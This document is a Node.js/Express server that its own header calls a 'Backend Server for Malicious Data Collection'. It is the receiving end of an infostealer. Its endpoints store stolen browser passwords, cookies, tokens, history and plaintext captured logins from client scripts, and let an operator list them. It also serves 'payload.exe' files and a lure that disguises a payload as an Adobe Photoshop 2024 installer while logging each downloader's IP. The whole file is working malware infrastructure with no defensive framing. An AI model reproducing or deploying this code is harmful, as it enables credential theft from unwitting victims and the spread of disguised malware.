/**
 * Backend Server for Malicious Data Collection
 * - Receives JSON data and stores in Aiven Cloud MySQL Database
 * - Handles file transfers (exe files)
 */

const express = require('express');
const mysql = require('mysql2/promise');
const multer = require('multer');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();

// Trust proxy for DigitalOcean App Platform
app.set('trust proxy', true);

// Middleware
app.use(helmet()); // Security headers
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database configuration from .env (MySQL/Aiven)
const dbConfig = {
    host: process.env.DB_HOST,
    port: parseInt(process.env.DB_PORT) || 21011,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    ssl: {
        rejectUnauthorized: false
    }
};

// Server configuration
const PORT = parseInt(process.env.PORT) || 5000;

// Directory for storing executable files
const FILES_DIR = path.join(__dirname, 'files');

// Ensure files directory exists
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// Log file path
const LOG_FILE = path.join(__dirname, 'server.log');

/**
 * Append a log entry to the log file
 */
function appendLog(message) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${message}\n`;
    console.log(logEntry.trim());
    fs.appendFileSync(LOG_FILE, logEntry);
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, FILES_DIR);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});
const upload = multer({ storage });

// Database connection pool
let pool;
let dbConnected = false;
let mockStorageEnabled = false;
let mockData = [];

/**
 * Create and return a database connection pool
 */
async function createPool() {
    try {
        pool = mysql.createPool(dbConfig);
        console.log('[✓] Database pool created successfully');
        dbConnected = true;
        mockStorageEnabled = false;
        return pool;
    } catch (error) {
        console.error(`[✗] Database connection error: ${error.message}`);
        console.error('[!] Falling back to mock storage');
        dbConnected = false;
        mockStorageEnabled = true;
        return null;
    }
}

/**
 * Get a connection from the pool
 */
async function getDbConnection() {
    if (!pool || !dbConnected) {
        throw new Error('Database not available');
    }
    return pool.getConnection();
}

/**
 * Initialize database tables if they don't exist
 */
async function initDatabase() {
    if (!dbConnected) {
        console.log('[!] Database not connected, skipping table initialization');
        return;
    }
    
    try {
        const conn = await getDbConnection();
        
        // Create table for storing received data
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS received_data (
                id INT AUTO_INCREMENT PRIMARY KEY,
                data JSON NOT NULL,
                source_ip VARCHAR(50),
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_type VARCHAR(100)
            )
        `);
        
        // Create table for file transfer logs
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS file_transfers (
                id INT AUTO_INCREMENT PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                target_ip VARCHAR(50),
                transferred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status VARCHAR(50) DEFAULT 'pending'
            )
        `);
        
        // ========== SINGLE TABLE FOR BROWSER DATA ==========
        // DataBrowser table - stores all browser tokens and credentials
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS DataBrowser (
                id INT AUTO_INCREMENT PRIMARY KEY,
                hostname VARCHAR(255),
                username VARCHAR(255),
                os VARCHAR(100),
                os_version VARCHAR(255),
                architecture VARCHAR(50),
                source_ip VARCHAR(50),
                browser_data JSON NOT NULL,
                passwords_count INT DEFAULT 0,
                cookies_count INT DEFAULT 0,
                tokens_count INT DEFAULT 0,
                history_count INT DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_hostname (hostname),
                INDEX idx_username (username),
                INDEX idx_created (created_at)
            )
        `);

        // ========== TABLE FOR CAPTURED CREDENTIALS ==========
        // CapturedCredentials table - stores login credentials captured by main.py
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS CapturedCredentials (
                id INT AUTO_INCREMENT PRIMARY KEY,
                hostname VARCHAR(255),
                system_username VARCHAR(255),
                source_ip VARCHAR(50),
                captured_url VARCHAR(500),
                captured_username VARCHAR(255),
                captured_password VARCHAR(255),
                capture_type VARCHAR(50),
                browser VARCHAR(100),
                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_hostname (hostname),
                INDEX idx_captured_url (captured_url),
                INDEX idx_captured_at (captured_at)
            )
        `);

        conn.release();
        console.log('[✓] Database tables initialized successfully');
    } catch (error) {
        console.error(`[✗] Database initialization error: ${error.message}`);
        dbConnected = false;
        mockStorageEnabled = true;
    }
}

// ==================== DATA RECEIVING ENDPOINTS ====================

/**
 * Endpoint to receive JSON data and store in database
 * Expected: JSON body with any structure
 */
app.post('/api/receive', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data || Object.keys(data).length === 0) {
            return res.status(400).json({ error: 'No data provided' });
        }
        
        const sourceIp = req.ip || req.connection.remoteAddress;
        const dataType = req.query.type || 'general';
        
        const dataSize = JSON.stringify(data).length;
        console.log(`[*] Received data from ${sourceIp}, type: ${dataType}, size: ${dataSize} bytes`);
        
        let recordId = null;
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            try {
                const [result] = await conn.execute(
                    `INSERT INTO received_data (data, source_ip, data_type, received_at)
                     VALUES (?, ?, ?, ?)`,
                    [JSON.stringify(data), sourceIp, dataType, new Date()]
                );
                
                recordId = result.insertId;
                conn.release();
                console.log(`[✓] Data stored in database with ID: ${recordId}`);
                
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database insert error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            recordId = mockData.length + 1;
            mockData.push({
                id: recordId,
                data: data,
                source_ip: sourceIp,
                data_type: dataType,
                received_at: new Date()
            });
            console.log(`[✓] Data stored in mock storage with ID: ${recordId}`);
        }
        
        return res.status(201).json({
            status: 'success',
            message: 'Data received and stored',
            id: recordId,
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving data: ${error.message}`);
        return res.status(500).json({ 
            error: error.message || 'Internal server error',
            details: error.code || error.errno || 'Unknown error'
        });
    }
});

// ==================== BROWSER DATA ENDPOINT ====================

/**
 * Endpoint to receive browser data from tokenAccess.py
 * Stores all data in single DataBrowser table
 */
app.post('/api/browser-data', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data || !data.system_info) {
            return res.status(400).json({ error: 'Invalid data format - missing system_info' });
        }
        
        const sourceIp = req.ip || req.connection.remoteAddress;
        const systemInfo = data.system_info;
        
        console.log(`[*] Received browser data from ${systemInfo.hostname} (${sourceIp})`);
        
        // Count items
        const passwordsCount = data.passwords?.total_count || data.passwords?.data?.length || 0;
        const cookiesCount = data.cookies?.total_count || data.cookies?.data?.length || 0;
        const tokensCount = data.tokens?.total_count || data.tokens?.data?.length || 0;
        const historyCount = data.history?.total_count || data.history?.data?.length || 0;
        
        let recordId = null;
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            try {
                const [result] = await conn.execute(`
                    INSERT INTO DataBrowser 
                    (hostname, username, os, os_version, architecture, source_ip, browser_data, 
                     passwords_count, cookies_count, tokens_count, history_count)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                `, [
                    systemInfo.hostname || '',
                    systemInfo.username || '',
                    systemInfo.os || '',
                    systemInfo.os_version || '',
                    systemInfo.architecture || '',
                    sourceIp,
                    JSON.stringify(data),
                    passwordsCount,
                    cookiesCount,
                    tokensCount,
                    historyCount
                ]);
                
                recordId = result.insertId;
                conn.release();
                
                console.log(`[✓] Browser data stored with ID: ${recordId}`);
                console.log(`    Passwords: ${passwordsCount}, Cookies: ${cookiesCount}, Tokens: ${tokensCount}, History: ${historyCount}`);
                
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            recordId = mockData.length + 1;
            mockData.push({
                id: recordId,
                type: 'browser_data',
                hostname: systemInfo.hostname,
                username: systemInfo.username,
                data: data,
                source_ip: sourceIp,
                received_at: new Date()
            });
            console.log(`[✓] Stored in mock storage with ID: ${recordId}`);
        }
        
        return res.status(201).json({
            status: 'success',
            message: 'Browser data received and stored',
            id: recordId,
            stats: {
                passwords: passwordsCount,
                cookies: cookiesCount,
                tokens: tokensCount,
                history: historyCount
            },
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving browser data: ${error.message}`);
        return res.status(500).json({ 
            error: error.message || 'Internal server error',
            details: error.code || 'Unknown error'
        });
    }
});

/**
 * Endpoint to get all browser data records
 */
app.get('/api/browser-data', async (req, res) => {
    try {
        if (!dbConnected || !pool) {
            return res.status(200).json({ 
                data: mockData.filter(d => d.type === 'browser_data'),
                storage: 'memory'
            });
        }
        
        const conn = await getDbConnection();
        
        const [rows] = await conn.execute(`
            SELECT id, hostname, username, os, os_version, architecture, source_ip,
                   passwords_count, cookies_count, tokens_count, history_count, created_at
            FROM DataBrowser
            ORDER BY created_at DESC
            LIMIT 100
        `);
        
        conn.release();
        
        return res.status(200).json({ data: rows, count: rows.length });
        
    } catch (error) {
        console.error(`[✗] Error getting browser data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to get specific browser data record with full details
 */
app.get('/api/browser-data/:id', async (req, res) => {
    try {
        const recordId = req.params.id;
        
        if (!dbConnected || !pool) {
            const record = mockData.find(d => d.id == recordId && d.type === 'browser_data');
            return res.status(200).json({ data: record || null, storage: 'memory' });
        }
        
        const conn = await getDbConnection();
        
        const [rows] = await conn.execute('SELECT * FROM DataBrowser WHERE id = ?', [recordId]);
        
        conn.release();
        
        if (rows.length === 0) {
            return res.status(404).json({ error: 'Record not found' });
        }
        
        // Parse the JSON browser_data
        const record = rows[0];
        if (typeof record.browser_data === 'string') {
            record.browser_data = JSON.parse(record.browser_data);
        }
        
        return res.status(200).json({ data: record });
        
    } catch (error) {
        console.error(`[✗] Error getting browser data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== CREDENTIALS CAPTURE ENDPOINTS ====================

/**
 * Endpoint to receive captured credentials from main.py
 * Expected: { hostname, system_username, credentials: [{ url, username, password, type, browser }] }
 */
app.post('/api/credentials', async (req, res) => {
    try {
        const data = req.body;

        if (!data || !data.credentials || !Array.isArray(data.credentials)) {
            return res.status(400).json({ error: 'Invalid data format - missing credentials array' });
        }

        const sourceIp = req.ip || req.connection.remoteAddress;
        const hostname = data.hostname || 'unknown';
        const systemUsername = data.system_username || 'unknown';

        console.log(`[*] Received ${data.credentials.length} credentials from ${hostname} (${sourceIp})`);

        let insertedCount = 0;

        if (dbConnected && pool) {
            const conn = await getDbConnection();

            try {
                for (const cred of data.credentials) {
                    await conn.execute(`
                        INSERT INTO CapturedCredentials
                        (hostname, system_username, source_ip, captured_url, captured_username,
                         captured_password, capture_type, browser, captured_at)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        hostname,
                        systemUsername,
                        sourceIp,
                        cred.url || '',
                        cred.username || '',
                        cred.password || '',
                        cred.type || 'login',
                        cred.browser || 'unknown',
                        new Date()
                    ]);
                    insertedCount++;
                }

                conn.release();
                console.log(`[✓] Stored ${insertedCount} credentials in database`);

            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            // Mock storage
            for (const cred of data.credentials) {
                mockData.push({
                    id: mockData.length + 1,
                    type: 'credential',
                    hostname,
                    system_username: systemUsername,
                    source_ip: sourceIp,
                    ...cred,
                    received_at: new Date()
                });
                insertedCount++;
            }
            console.log(`[✓] Stored ${insertedCount} credentials in mock storage`);
        }

        return res.status(201).json({
            status: 'success',
            message: 'Credentials received and stored',
            count: insertedCount,
            storage: dbConnected ? 'database' : 'memory'
        });

    } catch (error) {
        console.error(`[✗] Error receiving credentials: ${error.message}`);
        return res.status(500).json({
            error: error.message || 'Internal server error'
        });
    }
});

/**
 * Endpoint to get all captured credentials
 */
app.get('/api/credentials', async (req, res) => {
    try {
        if (!dbConnected || !pool) {
            return res.status(200).json({
                data: mockData.filter(d => d.type === 'credential'),
                storage: 'memory'
            });
        }

        const conn = await getDbConnection();

        const [rows] = await conn.execute(`
            SELECT id, hostname, system_username, source_ip, captured_url,
                   captured_username, captured_password, capture_type, browser, captured_at
            FROM CapturedCredentials
            ORDER BY captured_at DESC
            LIMIT 100
        `);

        conn.release();

        return res.status(200).json({ data: rows, count: rows.length });

    } catch (error) {
        console.error(`[✗] Error getting credentials: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== FILE TRANSFER ENDPOINTS ====================

/**
 * Endpoint to transfer executable file to client
 */
app.get('/api/transfer/file', async (req, res) => {
    try {
        const filename = req.query.filename || 'payload.exe';
        const filePath = path.join(FILES_DIR, filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        const targetIp = req.ip || req.connection.remoteAddress;
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            await conn.execute(
                `INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
                 VALUES (?, ?, ?, ?)`,
                [filename, targetIp, 'completed', new Date()]
            );
            conn.release();
        }
        
        console.log(`[*] File '${filename}' transferred to ${targetIp}`);
        
        return res.download(filePath, filename);
        
    } catch (error) {
        console.error(`[✗] Error transferring file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to upload files to server
 */
app.post('/api/transfer/upload', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file provided' });
        }
        
        console.log(`[*] File '${req.file.originalname}' uploaded successfully`);
        
        return res.status(201).json({
            status: 'success',
            message: 'File uploaded',
            filename: req.file.originalname
        });
        
    } catch (error) {
        console.error(`[✗] Error uploading file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// download foder  
// Serve the EXE file directly (no ZIP)
app.get('/download', (req, res) => {
    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
    const ip = req.ip || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';
    
    appendLog(`DOWNLOAD_REQUEST | IP: ${ip} | UA: ${ua}`);
    
    if (fs.existsSync(exePath)) {
        // Set headers for EXE download
        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', 'attachment; filename="Adobe_Photoshop_2024_Setup.exe"');
        
        res.download(exePath, 'Adobe_Photoshop_2024_Setup.exe', err => {
            if (err) {
                appendLog(`DOWNLOAD_ERROR | ${err.message}`);
            } else {
                appendLog(`DOWNLOAD_SERVED | IP: ${ip} | File: Adobe_Photoshop_2024_Setup.exe`);
            }
        });
    } else {
        appendLog(`DOWNLOAD_FAILED | Photoshop_Setup.exe not found at ${exePath}`);
        res.status(404).send(`
            <h1>Download Not Available</h1>
            <p>The installer is being prepared. Please try again later.</p>
            <a href="/">Go Back</a>
        `);
    }
});

// ==================== UTILITY ENDPOINTS ====================

/**
 * Health check endpoint
 */
app.get('/api/health', async (req, res) => {
    try {
        let dbStatus = 'disconnected';
        
        if (dbConnected && pool) {
            try {
                const conn = await getDbConnection();
                await conn.execute('SELECT 1');
                conn.release();
                dbStatus = 'connected';
            } catch (error) {
                dbStatus = 'connection_error';
            }
        } else if (mockStorageEnabled) {
            dbStatus = 'using_mock_storage';
        }
        
        return res.status(200).json({
            status: 'healthy',
            database: dbStatus,
            mockStorage: mockStorageEnabled,
            mockDataCount: mockData.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        return res.status(500).json({
            status: 'unhealthy',
            database: 'error',
            error: error.message
        });
    }
});

/**
 * Retrieve all stored data
 */
app.get('/api/data', async (req, res) => {
    try {
        let data = [];
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            const [rows] = await conn.execute(`
                SELECT id, data, source_ip, data_type, received_at 
                FROM received_data 
                ORDER BY received_at DESC
                LIMIT 100
            `);
            
            conn.release();
            
            data = rows.map(row => ({
                id: row.id,
                data: typeof row.data === 'string' ? JSON.parse(row.data) : row.data,
                source_ip: row.source_ip,
                data_type: row.data_type,
                received_at: row.received_at ? row.received_at.toISOString() : null
            }));
        } else {
            data = mockData.map(item => ({
                id: item.id,
                data: item.data,
                source_ip: item.source_ip,
                data_type: item.data_type,
                received_at: item.received_at.toISOString()
            })).reverse().slice(0, 100);
        }
        
        return res.status(200).json({ data, count: data.length, storage: dbConnected ? 'database' : 'memory' });
        
    } catch (error) {
        console.error(`[✗] Error retrieving data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Root endpoint
 */
app.get('/', (req, res) => {
    return res.status(200).json({
        message: 'Backend Server Running',
        endpoints: {
            receive_data: 'POST /api/receive',
            browser_data: 'POST /api/browser-data',
            browser_data_list: 'GET /api/browser-data',
            browser_data_detail: 'GET /api/browser-data/:id',
            credentials_post: 'POST /api/credentials',
            credentials_get: 'GET /api/credentials',
            transfer_file: 'GET /api/transfer/file?filename=<name>',
            upload_file: 'POST /api/transfer/upload',
            health_check: 'GET /api/health',
            get_data: 'GET /api/data'
        }
    });
});

// ==================== SERVER STARTUP ====================

async function startServer() {
    console.log(`
    ╔═══════════════════════════════════════════════════════════╗
    ║           Backend Server - Data Collection                ║
    ║                    (Node.js/Express)                      ║
    ║                                                           ║
    ║  Endpoints:                                               ║
    ║  • POST /api/receive        - Receive JSON data           ║
    ║  • POST /api/browser-data   - Receive browser tokens      ║
    ║  • GET  /api/browser-data   - List all browser data       ║
    ║  • GET  /api/browser-data/:id - Get specific record       ║
    ║  • GET  /api/transfer/file  - Download file               ║
    ║  • POST /api/transfer/upload - Upload file                ║
    ║  • GET  /api/health         - Health check                ║
    ║  • GET  /api/data           - View stored data            ║
    ╚═══════════════════════════════════════════════════════════╝
    `);
    
    try {
        await createPool();
        await initDatabase();
    } catch (error) {
        console.log(`[!] Warning: Could not initialize database: ${error.message}`);
        console.log('[!] Using mock in-memory storage');
        mockStorageEnabled = true;
    }
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`[*] Starting server on http://0.0.0.0:${PORT}`);
        console.log(`[*] Storage mode: ${dbConnected ? 'DATABASE' : 'MOCK (In-Memory)'}`);
        console.log('[*] Press Ctrl+C to stop the server\n');
    });
}

startServer();

// Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('[*] SIGTERM received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('[*] SIGINT received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

module.exports = { app, initDatabase, PORT, FILES_DIR };
